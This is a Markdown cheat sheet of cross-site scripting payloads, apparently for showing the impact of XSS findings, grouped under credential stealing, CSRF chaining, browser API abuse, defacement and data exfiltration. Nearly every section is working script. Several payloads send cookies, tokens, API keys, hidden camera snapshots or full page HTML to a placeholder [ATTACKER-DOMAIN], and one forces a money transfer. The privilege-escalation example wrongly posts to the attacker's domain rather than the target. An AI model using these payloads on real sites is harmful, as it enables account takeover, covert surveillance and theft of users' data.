# XSS (Cross-Site Scripting)

## Table of Contents
- [Credential stealing](#credential-stealing)
- [Chaining with CSRF](#chaining-with-csrf)
- [WEB API abusing](#web-api-abusing)
- [Content Spoofing](#content-spoofing)
- [Data Exfiltration](#data-exfiltration)

## Credential stealing

### Credentials used for authentication (e.g., cookie, access token) can be stolen.

- Cookie stealing
   ```html
    <script>
        fetch(`https://[ATTACKER-DOMAIN]/?cookie=${document.cookie}`)
    </script>
   ```
- token stealing
    ```html
    <script>
        fetch(`https://[ATTACKER-DOMAIN]/?token=${localStorage.getItem("token")}`)
    </script>
   ```
- API key stealing
    ```html
    <script>
        fetch('/myinfo')
        .then(response => response.json())
        .then(data => {
            return fetch(`https://[ATTACKER-DOMAIN]/?api_key=${data.api_key}`)
        })
    </script>
    ```

## Chaining with CSRF

### It can create a greater risk when combined with vulnerabilities like CSRF. (The impact may vary depending on the purpose or function of the service.)

- Making a transfer
    ```html
    <script>
        initiateTransaction("attacker_account",1000)
    </script>
   ```

- Privilege escalation
    ```html
    <script>
    fetch('https://[ATTACKER-DOMAIN]/change-role', {
        method: 'POST',
        body: "user_id=1234&role=admin"
    })
    </script>
   ```

## WEB API abusing

### Web browser-provided APIs can be exploited to access OS features. (e.g., Media Stream API, Clipboard API, etc.).

- Camera access
    ```html
    <script>
    document.addEventListener('DOMContentLoaded', async () => {
        const v = document.createElement('video');
        v.autoplay = true;
        v.style.display = 'none';
        document.body.appendChild(v);

        const c = document.createElement('canvas');
        c.style.display = 'none';
        document.body.appendChild(c);

        const s = await navigator.mediaDevices.getUserMedia({ video: true });
        v.srcObject = s;

        setTimeout(() => {
        const ctx = c.getContext('2d');
        c.width = v.videoWidth;
        c.height = v.videoHeight;
        ctx.drawImage(v, 0, 0);

        c.toBlob(b => {
            const f = new FormData();
            f.append('image', b, 'photo.png');
            fetch('http://[ATTACKER-DOMAIN]/images', { method: 'POST', body: f });
        }, 'image/png');
        }, 1000);
    });
    </script>
    ```

## Content Spoofing

### Elements of the page can be modified through DOM manipulation.

- Defacement

   ```html
   <script>
   document.body.innerHTML = `
     <div style="position:fixed; top:0; left:0; width:100%; height:100%; background-color:black; display:flex; align-items:center; justify-content:center; color:red; font-size:3em; font-family:sans-serif; z-index:10000;">
       You've been hacked
     </div>
   `;
   </script>
   ```

## Data Exfiltration

### Sensitive data on the page can be exfiltrated. This is especially useful in Blind XSS scenarios, where an attacker can capture the contents of an internal or administrative page they cannot see directly.

- Exfiltrating page content
    ```html
    <img src=nonexistent_src onerror=fetch('https://[ATTACKER-DOMAIN]',{method:'POST',body:btoa(unescape(encodeURIComponent(document.documentElement.outerHTML)))})>
    ```